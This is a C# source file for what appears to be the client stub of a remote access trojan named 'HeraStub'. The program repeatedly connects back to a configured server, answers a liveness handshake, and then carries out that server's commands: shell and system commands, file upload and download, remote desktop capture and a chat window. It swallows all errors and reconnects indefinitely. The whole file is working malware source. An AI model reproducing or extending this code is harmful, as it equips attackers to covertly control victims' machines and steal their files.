using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;

namespace HeraStub
{
    class Program
    {
        public static Chat ChatInstance = null;
        [STAThread]
        public static void Handler(byte[] Details, int DetailSize, Socket ServerSocket)
        {
            try
            {
                String RawPacket = Encoding.ASCII.GetString(Details, 0, DetailSize);
                List<String> Packet = RawPacket.Split('|').ToList();
                //MessageBox.Show(BufferStr, "Packet Received!");
                switch (Packet[0])
                {
                    case "Info":
                        ClientHelper.GetInfo(ServerSocket);
                        break;
                    case "SysCom":
                        if (ClientHelper.HandleSystemCommand(Packet[1]) == true)
                        {
                            ServerSocket.Disconnect(true);
                        }
                        break;
                    case "Command":
                        ClientHelper.HandleShellExecute(Packet[1], ServerSocket);
                        break;
                    case "Chat":
                        if (ChatInstance != null)
                        {
                            ChatInstance.DisplayServerMessage(Packet[1], ChatInstance);
                        }
                        break;
                    case "SysSetup":
                        switch (Packet[1])
                        {
                            case "Chat":
                                ChatInstance = new Chat(ServerSocket);
                                Application.Run(ChatInstance);
                                break;
                            case "ChatClose":
                                if (ChatInstance != null)
                                {
                                    if (ChatInstance.InvokeRequired)
                                    {
                                        ChatInstance.BeginInvoke((MethodInvoker)delegate ()
                                        {
                                            ChatInstance.Close();
                                        });
                                    }
                                    else
                                    {
                                        ChatInstance.Close();
                                    }
                                    //ChatInstance = null;
                                }
                                break;
                        }
                        break;
                    case "FunCommand":
                        ClientHelper.HandleFunCommand(Packet);
                        break;
                    case "FileDetail":
                        ClientHelper.HandleFileCommand(Packet, ServerSocket);
                        break;
                    case "RDP":
                        ClientHelper.HandleRemoteDesktopScreen(Packet, ServerSocket);
                        break;
                    case "BeginDownload":
                        ClientHelper.HandleFileDownload(Packet, ServerSocket);
                        break;
                    case "BeginUpload":
                        ClientHelper.HandleStartFileUpload(Packet, ServerSocket);
                        break;
                    case "EndUpload":
                        //ClientHelper.HandleEndFileUpload(Packet, ServerSocket);
                        break;
                    case "DownloadConfirm":
                        ClientHelper.Confirmed = true;
                        break;
                    default:
                        //Handle File
                        if (Encoding.ASCII.GetString(Details, 0, 1) == "@")
                        {
                            ClientHelper.HandleFileChunk(Details, ServerSocket);
                        }
                        else if (Encoding.ASCII.GetString(Details, 0, 1) == "$")
                        {
                            ClientHelper.HandleFileEndChunk(Details, ServerSocket);
                        }
                        break;
                }
            }
            catch
            {

            }
        }

        static void Main()
        {
            //Main
            while (true)
            {
                IPAddress ConnectionAddress = IPAddress.Parse("127.0.0.1");
                try
                {
                    ConnectionAddress = IPAddress.Parse(Settings.IPAddress);
                }
                catch
                {
                    ConnectionAddress = Dns.GetHostEntry(Settings.IPAddress).AddressList[0];
                }
                int Port = Convert.ToInt32(Settings.Port);
                IPEndPoint ConnectionPoint = new IPEndPoint(ConnectionAddress, Port);
                Socket ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                try
                {
                    //MessageBox.Show("Connecting...");
                    ServerSocket.Connect(ConnectionPoint);
                    while (ServerSocket.Connected)
                    {
                        //MessageBox.Show("Connection Established!");
                        byte[] KeyAuth = new byte[1024];
                        int KeySize = ServerSocket.Receive(KeyAuth);
                        String KeyRequest = Encoding.ASCII.GetString(KeyAuth, 0, KeySize);
                        if (KeyRequest == "Confirmation Of Life")
                        {
                            ServerSocket.Send(Encoding.ASCII.GetBytes("Live And Well"));
                            bool Looping = true;
                            Application.EnableVisualStyles();
                            while (Looping)
                            {
                                byte[] RecvBuffer = new byte[1048576];
                                IAsyncResult Accepted;
                                Action action = () =>
                                {
                                    try
                                    {
                                        int BufferSize = ServerSocket.Receive(RecvBuffer);
                                        Thread RunningPacket = new Thread((new ThreadStart(() => Handler(RecvBuffer, BufferSize, ServerSocket))));
                                        RunningPacket.Start();
                                    }
                                    catch
                                    {
                                        Looping = false;
                                        try
                                        {
                                            ServerSocket.Disconnect(false);
                                        } catch { }
                                    }
                                };
                                Accepted = action.BeginInvoke(null, null);
                                Accepted.AsyncWaitHandle.WaitOne(5000);
                                if (!ServerSocket.Connected)
                                {
                                    Looping = false;
                                    ServerSocket.Disconnect(false);
                                }
                            }
                        }
                        else
                        {
                            ServerSocket.Disconnect(false);
                        }
                    }
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.ToString());
                    Thread.Sleep(Convert.ToInt32(Settings.Reconnect));
                }
            }
        }
    }
}
